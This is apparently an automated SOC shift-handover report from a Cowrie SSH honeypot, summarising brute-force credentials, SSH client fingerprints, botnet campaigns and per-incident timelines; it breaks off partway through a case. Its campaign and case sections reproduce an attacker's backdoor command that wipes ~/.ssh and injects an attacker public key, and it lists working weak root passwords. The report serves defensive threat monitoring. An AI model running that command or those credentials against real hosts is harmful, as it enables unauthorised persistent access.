# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T19:29:06Z |
| **Shift Time** | 19:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **130** |
| Confirmed Threats | **99** |
| False Positives Filtered | **31** (23.8%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **8** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **111** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **91** |
| Unique Credential Pairs | **85** |
| Unique Usernames | **64** |
| Unique Passwords | **75** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 2 |
| `admin2` | 2 |
| `adminuser` | 2 |
| `amir` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 10 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `admin2` | 2 |
| `adminuser` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `admin2` | `admin2` | 2 |
| `adminuser` | `adminuser` | 2 |
| `amir` | `123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Passw0rd@2026` | `43.153.12.68` | 2026-06-06T17:47:38 |
| `root` | `3245gs5662d34` | `43.153.12.68` | 2026-06-06T17:47:44 |
| `root` | `qwe123!@` | `103.75.199.4` | 2026-06-06T18:02:23 |
| `root` | `abcd@1234` | `103.75.199.4` | 2026-06-06T18:03:12 |
| `root` | `test@123` | `103.75.199.4` | 2026-06-06T18:03:18 |
| `root` | `!qaz@WSX` | `103.75.199.4` | 2026-06-06T18:04:30 |
| `root` | `0` | `103.75.199.4` | 2026-06-06T18:04:35 |
| `root` | `Huawei123` | `103.75.199.4` | 2026-06-06T18:04:41 |
| `root` | `root1234` | `103.75.199.4` | 2026-06-06T18:04:46 |
| `root` | `t0talc0ntr0l4!` | `103.75.199.4` | 2026-06-06T18:04:52 |
| `root` | `Aa123321` | `103.75.199.4` | 2026-06-06T18:06:37 |
| `root` | `111` | `103.75.199.4` | 2026-06-06T18:07:21 |
| `root` | `Pass@123` | `103.75.199.4` | 2026-06-06T18:07:27 |
| `root` | `Password@123` | `103.75.199.4` | 2026-06-06T18:07:32 |
| `root` | `QWEqwe123` | `103.75.199.4` | 2026-06-06T18:07:38 |
| `root` | `test1234` | `103.75.199.4` | 2026-06-06T18:07:43 |
| `root` | `Aa112233` | `217.154.45.93` | 2026-06-06T18:28:00 |
| `root` | `3245gs5662d34` | `217.154.45.93` | 2026-06-06T18:28:04 |
| `root` | `admin` | `27.43.207.165` | 2026-06-06T19:12:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **130** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 77 |
| libssh | 42 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 74 | 2 |
| `f555226df196...` | Mirai/variant | 34 | 5 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 74 | 2 | Generic scanner |
| `f555226df196...` | libssh | 34 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
start
```
```
enable
```
```
config terminal
```
```
system
```
```
linuxshell
```
Source IPs: `27.43.207.165`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.153.12.68`, `217.154.45.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **15** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 5 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | HIGH |
| `AS17816` | China Unicom IP network China169 Guangdong province | 1 | LOW |
| `AS396982` | Google LLC | 1 | LOW |
| `AS8560` | IONOS SE | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8f695e6e1e18

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-06-06 17:47 |
| **Last Seen** | 2026-06-06 17:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 17:47:36` | `cowrie.session.connect` |
| `2026-06-06 17:47:36` | `cowrie.client.version` |
| `2026-06-06 17:47:37` | `cowrie.client.kex` |
| `2026-06-06 17:47:38` | `cowrie.login.success` |
| `2026-06-06 17:47:38` | `cowrie.session.params` |
| `2026-06-06 17:47:38` | `cowrie.command.input` |
| `2026-06-06 17:47:38` | `cowrie.command.failed` |
| `2026-06-06 17:47:39` | `cowrie.log.closed` |
| `2026-06-06 17:47:39` | `cowrie.session.params` |
| `2026-06-06 17:47:39` | `cowrie.command.input` |
| `2026-06-06 17:47:39` | `cowrie.session.file_download` |
| `2026-06-06 17:47:39` | `cowrie.log.closed` |
| `2026-06-06 17:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326cbe679d99

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-06-06 17:47 |
| **Last Seen** | 2026-06-06 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 17:47:42` | `cowrie.session.connect` |
| `2026-06-06 17:47:42` | `cowrie.client.version` |
| `2026-06-06 17:47:43` | `cowrie.client.kex` |
| `2026-06-06 17:47:44` | `cowrie.login.success` |
| `2026-06-06 17:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7efd1ae3b94

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:02 |
| **Last Seen** | 2026-06-06 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:02:22` | `cowrie.session.connect` |
| `2026-06-06 18:02:22` | `cowrie.client.version` |
| `2026-06-06 18:02:22` | `cowrie.client.kex` |
| `2026-06-06 18:02:23` | `cowrie.login.success` |
| `2026-06-06 18:02:23` | `cowrie.session.params` |
| `2026-06-06 18:02:23` | `cowrie.command.input` |
| `2026-06-06 18:02:23` | `cowrie.log.closed` |
| `2026-06-06 18:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997e7bd27ad1

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:03 |
| **Last Seen** | 2026-06-06 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:03:12` | `cowrie.session.connect` |
| `2026-06-06 18:03:12` | `cowrie.client.version` |
| `2026-06-06 18:03:12` | `cowrie.client.kex` |
| `2026-06-06 18:03:12` | `cowrie.login.success` |
| `2026-06-06 18:03:13` | `cowrie.session.params` |
| `2026-06-06 18:03:13` | `cowrie.command.input` |
| `2026-06-06 18:03:13` | `cowrie.log.closed` |
| `2026-06-06 18:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631dab46a8c4

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:03 |
| **Last Seen** | 2026-06-06 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:03:17` | `cowrie.session.connect` |
| `2026-06-06 18:03:17` | `cowrie.client.version` |
| `2026-06-06 18:03:18` | `cowrie.client.kex` |
| `2026-06-06 18:03:18` | `cowrie.login.success` |
| `2026-06-06 18:03:18` | `cowrie.session.params` |
| `2026-06-06 18:03:18` | `cowrie.command.input` |
| `2026-06-06 18:03:18` | `cowrie.log.closed` |
| `2026-06-06 18:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082fc1e8b664

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:04 |
| **Last Seen** | 2026-06-06 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:04:29` | `cowrie.session.connect` |
| `2026-06-06 18:04:29` | `cowrie.client.version` |
| `2026-06-06 18:04:29` | `cowrie.client.kex` |
| `2026-06-06 18:04:30` | `cowrie.login.success` |
| `2026-06-06 18:04:30` | `cowrie.session.params` |
| `2026-06-06 18:04:30` | `cowrie.command.input` |
| `2026-06-06 18:04:30` | `cowrie.log.closed` |
| `2026-06-06 18:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabc02fd22d5

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:04 |
| **Last Seen** | 2026-06-06 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:04:35` | `cowrie.session.connect` |
| `2026-06-06 18:04:35` | `cowrie.client.version` |
| `2026-06-06 18:04:35` | `cowrie.client.kex` |
| `2026-06-06 18:04:35` | `cowrie.login.success` |
| `2026-06-06 18:04:36` | `cowrie.session.params` |
| `2026-06-06 18:04:36` | `cowrie.command.input` |
| `2026-06-06 18:04:36` | `cowrie.log.closed` |
| `2026-06-06 18:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5845d5001954

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:04 |
| **Last Seen** | 2026-06-06 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:04:40` | `cowrie.session.connect` |
| `2026-06-06 18:04:40` | `cowrie.client.version` |
| `2026-06-06 18:04:40` | `cowrie.client.kex` |
| `2026-06-06 18:04:41` | `cowrie.login.success` |
| `2026-06-06 18:04:41` | `cowrie.session.params` |
| `2026-06-06 18:04:41` | `cowrie.command.input` |
| `2026-06-06 18:04:41` | `cowrie.log.closed` |
| `2026-06-06 18:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a54e17230b

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:04 |
| **Last Seen** | 2026-06-06 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:04:46` | `cowrie.session.connect` |
| `2026-06-06 18:04:46` | `cowrie.client.version` |
| `2026-06-06 18:04:46` | `cowrie.client.kex` |
| `2026-06-06 18:04:46` | `cowrie.login.success` |
| `2026-06-06 18:04:47` | `cowrie.session.params` |
| `2026-06-06 18:04:47` | `cowrie.command.input` |
| `2026-06-06 18:04:47` | `cowrie.log.closed` |
| `2026-06-06 18:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61769dd21e9

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:04 |
| **Last Seen** | 2026-06-06 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:04:51` | `cowrie.session.connect` |
| `2026-06-06 18:04:51` | `cowrie.client.version` |
| `2026-06-06 18:04:51` | `cowrie.client.kex` |
| `2026-06-06 18:04:52` | `cowrie.login.success` |
| `2026-06-06 18:04:52` | `cowrie.session.params` |
| `2026-06-06 18:04:52` | `cowrie.command.input` |
| `2026-06-06 18:04:52` | `cowrie.log.closed` |
| `2026-06-06 18:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0815d5d1c323

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:06 |
| **Last Seen** | 2026-06-06 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:06:36` | `cowrie.session.connect` |
| `2026-06-06 18:06:36` | `cowrie.client.version` |
| `2026-06-06 18:06:37` | `cowrie.client.kex` |
| `2026-06-06 18:06:37` | `cowrie.login.success` |
| `2026-06-06 18:06:37` | `cowrie.session.params` |
| `2026-06-06 18:06:37` | `cowrie.command.input` |
| `2026-06-06 18:06:37` | `cowrie.log.closed` |
| `2026-06-06 18:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d672ae102d

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:07 |
| **Last Seen** | 2026-06-06 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:07:21` | `cowrie.session.connect` |
| `2026-06-06 18:07:21` | `cowrie.client.version` |
| `2026-06-06 18:07:21` | `cowrie.client.kex` |
| `2026-06-06 18:07:21` | `cowrie.login.success` |
| `2026-06-06 18:07:22` | `cowrie.session.params` |
| `2026-06-06 18:07:22` | `cowrie.command.input` |
| `2026-06-06 18:07:22` | `cowrie.log.closed` |
| `2026-06-06 18:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66e4719a3c5

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:07 |
| **Last Seen** | 2026-06-06 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:07:26` | `cowrie.session.connect` |
| `2026-06-06 18:07:26` | `cowrie.client.version` |
| `2026-06-06 18:07:26` | `cowrie.client.kex` |
| `2026-06-06 18:07:27` | `cowrie.login.success` |
| `2026-06-06 18:07:27` | `cowrie.session.params` |
| `2026-06-06 18:07:27` | `cowrie.command.input` |
| `2026-06-06 18:07:27` | `cowrie.log.closed` |
| `2026-06-06 18:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e2f12bdf019

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:07 |
| **Last Seen** | 2026-06-06 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:07:32` | `cowrie.session.connect` |
| `2026-06-06 18:07:32` | `cowrie.client.version` |
| `2026-06-06 18:07:32` | `cowrie.client.kex` |
| `2026-06-06 18:07:32` | `cowrie.login.success` |
| `2026-06-06 18:07:33` | `cowrie.session.params` |
| `2026-06-06 18:07:33` | `cowrie.command.input` |
| `2026-06-06 18:07:33` | `cowrie.log.closed` |
| `2026-06-06 18:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b45d37bc6a7

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:07 |
| **Last Seen** | 2026-06-06 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:07:37` | `cowrie.session.connect` |
| `2026-06-06 18:07:37` | `cowrie.client.version` |
| `2026-06-06 18:07:38` | `cowrie.client.kex` |
| `2026-06-06 18:07:38` | `cowrie.login.success` |
| `2026-06-06 18:07:38` | `cowrie.session.params` |
| `2026-06-06 18:07:38` | `cowrie.command.input` |
| `2026-06-06 18:07:38` | `cowrie.log.closed` |
| `2026-06-06 18:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac7ebc2dd4be

| Field | Detail |
|---|---|
| **Source IP** | `103.75.199[.]4` |
| **First Seen** | 2026-06-06 18:07 |
| **Last Seen** | 2026-06-06 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:07:43` | `cowrie.session.connect` |
| `2026-06-06 18:07:43` | `cowrie.client.version` |
| `2026-06-06 18:07:43` | `cowrie.client.kex` |
| `2026-06-06 18:07:43` | `cowrie.login.success` |
| `2026-06-06 18:07:44` | `cowrie.session.params` |
| `2026-06-06 18:07:44` | `cowrie.command.input` |
| `2026-06-06 18:07:44` | `cowrie.log.closed` |
| `2026-06-06 18:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.199[.]4` to AbuseIPDB if not already reported
- [ ] Block `103.75.199[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d15368e9e34

| Field | Detail |
|---|---|
| **Source IP** | `217.154.45[.]93` |
| **First Seen** | 2026-06-06 18:27 |
| **Last Seen** | 2026-06-06 18:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:27:59` | `cowrie.session.connect` |
| `2026-06-06 18:27:59` | `cowrie.client.version` |
| `2026-06-06 18:28:00` | `cowrie.client.kex` |
| `2026-06-06 18:28:00` | `cowrie.login.success` |
| `2026-06-06 18:28:01` | `cowrie.session.params` |
| `2026-06-06 18:28:01` | `cowrie.command.input` |
| `2026-06-06 18:28:01` | `cowrie.command.failed` |
| `2026-06-06 18:28:01` | `cowrie.log.closed` |
| `2026-06-06 18:28:01` | `cowrie.session.params` |
| `2026-06-06 18:28:01` | `cowrie.command.input` |
| `2026-06-06 18:28:01` | `cowrie.session.file_download` |
| `2026-06-06 18:28:01` | `cowrie.log.closed` |
| `2026-06-06 18:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.45[.]93` to AbuseIPDB if not already reported
- [ ] Block `217.154.45[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47527fd68a0

| Field | Detail |
|---|---|
| **Source IP** | `217.154.45[.]93` |
| **First Seen** | 2026-06-06 18:28 |
